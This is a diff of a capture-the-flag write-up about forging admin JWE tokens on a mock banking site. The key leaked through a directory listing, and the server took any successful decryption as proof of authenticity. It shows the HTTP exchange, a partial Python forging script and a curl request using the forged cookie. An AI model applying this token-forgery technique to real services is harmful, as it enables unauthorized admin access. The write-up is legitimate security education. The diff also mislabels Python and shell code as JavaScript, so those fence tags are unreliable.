@@ -22,7 +22,7 @@ author: 0xuserm9
 
 ---
 ## TL;DR
-The application leaked its JWE public key via a directory listing, allowing attackers to forge admin tokens by encrypting {"sub":"admin"} with the exposed key. The server mistakenly treated successful decryption as proof of authenticity.
+The application leaked its **JWE public key** via a directory listing, allowing attackers to forge admin tokens by encrypting `{"sub":"admin"}` with the exposed key. The server mistakenly treated successful decryption as proof of authenticity.
 
 ---
 
@@ -39,7 +39,7 @@ Navigating to the target revealed a retro banking interface with minimal functio
 ## Step 2: Finding Test Credentials
 
 Scrolling through the HTML source, I found a link buried in the footer:
-```
+```js
 <a href="/resources/FNSB_InternetBanking_Guide.pdf">
   Access our Internet Banking guide here.
 </a>
@@ -61,14 +61,14 @@ These credentials proved crucial for understanding the authentication flow.
 Logging in as `testuser` revealed:
 
 **Request:**
-```
+```js
 POST /login HTTP/1.1
 Content-Type: application/json
 
 {"username":"testuser","password":"testpass123"}
 ```
 **Response:**
-```
+```js
 HTTP/1.1 200 OK
 Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X... [truncated]
 
@@ -80,7 +80,7 @@ BASE64URL(protected_header).BASE64URL(encrypted_key).BASE64URL(iv).BASE64URL(cip
 ```
 ## Token Analysis:
 
-```
+```js
 {
   "cty": "JWT",
   "enc": "A256GCM",
@@ -102,7 +102,7 @@ The crucial point: **RSA-OAEP** is an **asymmetric encryption scheme**. Anyone p
 With the session cookie, I tried accessing `/admin`:
 
 **The response** was:
-```
+```js
 {"error":"Forbidden: admin subject required"}
 ```
 
@@ -116,7 +116,7 @@ This error tells us two things:
 ## Directory Listing Exposure
 
 While enumerating directories, I discovered that `/resources/` had directory listing enabled:
-```
+```js
 Index of /resources/
 [ ] FNSB_InternetBanking_Guide.pdf    2026-03-14 14:23  2.4M
 [ ] key.pem                            2026-03-14 14:23  1.7K
@@ -143,7 +143,7 @@ OQIDAQAB
 
 Python script to encrypt a malicious payload using the server's own public key:
 
-```
+```js
 from joserfc import jwe
 from joserfc.jwk import RSAKey
 from joserfc.jwe import JWERegistry
@@ -168,11 +168,11 @@ print(token)
 
 ### Use the Forged Token:
 
-```
+```js
 curl -s -H "Cookie: fnsb_token=$TOKEN" http://challenge.utctf.live:5926/admin
 ```
 The response contains the `admin` console and the **flag**:
-```
+```js
 <!DOCTYPE html>
 <html>
 <head><title>FNSB SysAdmin Console</title></head>
